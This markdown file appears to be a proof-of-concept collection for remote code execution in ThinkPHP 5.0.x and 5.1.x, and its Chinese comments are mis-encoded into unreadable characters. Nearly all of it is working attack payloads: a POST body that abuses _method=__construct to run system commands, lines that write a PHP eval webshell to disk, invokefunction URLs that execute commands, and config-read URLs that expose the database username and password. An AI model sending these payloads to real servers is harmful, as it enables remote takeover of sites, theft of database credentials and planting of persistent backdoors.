# ThinkPHP_5.0.22



## poc



```php
POST /thinkphp/public/index.php?s=captcha HTTP/1.1

#  �鿴��ǰ�û�
_method=__construct&filter[]=system&method=get&get[]=whoami

#  д�� WebShell��Linux��
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php @eval(\$_POST['pass']);?>" > 1.php

#  д�� WebShell��Windows��
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo ^<?php @eval($_POST['pass']);?^> > 1.php
```

## poc



```php
#  �鿴���ݿ��û���
http://127.0.0.1/thinkphp/public/index.php?s=.|think\config/get&name=database.username

#  �鿴���ݿ�����
http://127.0.0.1/thinkphp/public/index.php?s=.|think\config/get&name=database.password

#  �鿴��ǰ�û�
http://127.0.0.1/thinkphp/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

#  phpinfo
index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

# �����汾poc

## ��php7�����޷�ʹ��assert

```php
_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=����&x=phpinfo();
```

## tp5

```php
http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1
```

## tp 5.0.21

```php
http://127.0.0.1/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

http://127.0.0.1/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

## tp 5.1.*

```php
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1

http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd

http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd

```

# �ο�����

https://xz.aliyun.com/t/3845

https://blog.csdn.net/qq_29647709/article/details/84956221

https://www.freebuf.com/vuls/194127.html